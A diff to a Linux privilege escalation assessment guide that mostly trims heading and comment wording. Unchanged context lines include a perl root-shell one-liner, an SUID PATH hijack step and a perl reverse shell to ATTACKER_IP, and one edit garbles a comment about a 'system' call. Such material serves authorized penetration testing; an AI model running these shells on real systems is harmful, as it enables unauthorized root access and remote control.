@@ -27,7 +27,7 @@ Execute systematic privilege escalation assessments on Linux systems to identify
 - Network access for reverse shell connections (if needed)
 - Attacker machine for payload hosting and receiving shells
 
-### Technical Requirements
+### Requirements
 
 - Understanding of Linux filesystem permissions and ownership
 - Familiarity with common Linux utilities and scripting
@@ -58,17 +58,17 @@ Execute systematic privilege escalation assessments on Linux systems to identify
 - Identified vulnerability details
 - Exploited configuration files
 
-## Core Workflow
+## Workflow
 
-### Phase 1: System Enumeration
+### Phase 1: Enumeration
 
-#### Basic System Information
+#### Basic Information
 
 Gather fundamental system details for vulnerability research:
 
 ```bash
 
-# Hostname and system role
+# Hostname and role
 
 hostname
 
@@ -80,7 +80,7 @@ uname -a
 
 cat /proc/version
 
-# Operating system details
+# Operating details
 
 cat /etc/issue
 cat /etc/*-release
@@ -171,7 +171,7 @@ env
 echo $PATH
 ```
 
-### Phase 2: Automated Enumeration
+### Phase 2: Enumeration
 
 Deploy automated scripts for comprehensive enumeration:
 
@@ -411,7 +411,7 @@ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
 
 ```bash
 
-# System crontab
+# crontab
 
 cat /etc/crontab
 
@@ -451,7 +451,7 @@ chmod +x /home/user/antivirus.sh
 
 strings /usr/local/bin/suid-binary
 
-# Shows: system("service apache2 start")
+# Shows:("service apache2 start")
 
 # Hijack by creating malicious binary in writable PATH
 
@@ -528,14 +528,14 @@ perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getpro
 
 ## Constraints and Guardrails
 
-### Operational Boundaries
+### Boundaries
 
 - Verify kernel exploits in test environment before production use
 - Failed kernel exploits may crash the system
 - Document all changes made during privilege escalation
 - Maintain access persistence only as authorized
 
-### Technical Limitations
+### Limitations
 
 - Modern kernels may have exploit mitigations (ASLR, SMEP, SMAP)
 - AppArmor/SELinux may restrict exploitation techniques
